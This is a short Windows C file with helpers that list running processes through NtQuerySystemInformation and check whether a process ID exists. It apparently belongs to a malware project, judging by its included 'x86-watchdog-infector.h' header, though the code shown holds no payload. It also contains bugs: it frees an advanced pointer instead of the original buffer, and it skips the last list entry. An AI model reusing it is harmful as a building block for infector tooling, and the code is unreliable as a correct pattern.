#include <Windows.h>
#include <winternl.h>

#include "x86-watchdog-infector.h"

int
process_list(PSYSTEM_PROCESS_INFORMATION* p_spi)
{
  ULONG length = 0;
  NTSTATUS status = 0;

  *p_spi = NULL;
  do {
    if (!NT_SUCCESS(status) && *p_spi != NULL) {
      VirtualFree(*p_spi, 0, MEM_RELEASE);

      if (status != STATUS_INFO_LENGTH_MISMATCH) {
        return -1;
      }
    }

    if (length != 0) {
      *p_spi =
        VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

      if (*p_spi == NULL) {
        return -2;
      }
    }

    status = NtQuerySystemInformation(
      SystemProcessInformation, *p_spi, length, &length);

  } while (!NT_SUCCESS(status));

  return 0;
}

int
process_exists(ULONGLONG proc_id)
{
  int ret = 0;
  PSYSTEM_PROCESS_INFORMATION p_spi = NULL;

  if (process_list(&p_spi) < 0) {
    return -1;
  }

  do {
    if ((ULONGLONG)p_spi->UniqueProcessId == proc_id) {
      ret = 1;
      goto free_p_spi;
    }

    p_spi =
      (PSYSTEM_PROCESS_INFORMATION)(((PBYTE)p_spi) + p_spi->NextEntryOffset);
  } while (p_spi->NextEntryOffset);

free_p_spi:
  VirtualFree(p_spi, 0, MEM_RELEASE);

  return ret;
}
